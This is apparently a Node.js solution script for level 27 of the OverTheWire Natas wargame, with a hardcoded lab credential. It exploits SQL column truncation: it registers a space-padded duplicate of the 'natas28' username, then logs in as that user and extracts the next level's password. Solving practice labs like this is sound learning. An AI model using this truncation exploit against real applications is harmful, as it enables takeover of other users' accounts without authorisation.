const http = require('http');
const querystring = require('querystring');

const auth = 'natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ';
const hostname = 'natas27.natas.labs.overthewire.org';
const session_id = 'nickontheweb';

const options = {
  base: ({path = '/index.php'} = {}) => ({
    auth,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=${session_id};`,
    },
    hostname,
    path,
    port: 80,
  }),
  get: params => ({
    ...options.base(params),
    method: 'GET',
  }),
  post: params => ({
    ...options.base(params),
    method: 'POST',
  }),
};

const post = (data, opts = options.post()) =>
  new Promise((resolve, reject) => {
    const req = http.request(opts, res => {
      let body = '';
      res.on('data', data => (body = body + data));
      res.on('end', () => resolve(body));
    });
    req.write(querystring.stringify(data));
    req.on('error', reject);
    req.end();
  });

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

const spaces = [...new Array(57)].map(() => ' ').join('');
const username = `natas28${spaces}natas28`; // will get truncated

post({username, password: 'password'})
  .then(() => post({username: `natas28`, password: 'password'}))
  .then(body => {
    const wasAuthed = body.match(/password/);

    wasAuthed ? console.log('Success!') : console.log('Failure!');
    if (!wasAuthed) return;

    const regex = /\[password\] =&gt; ([a-zA-Z0-9]{32})/;
    const password = body.match(regex)[1];

    console.log("Password: " + password);
  });
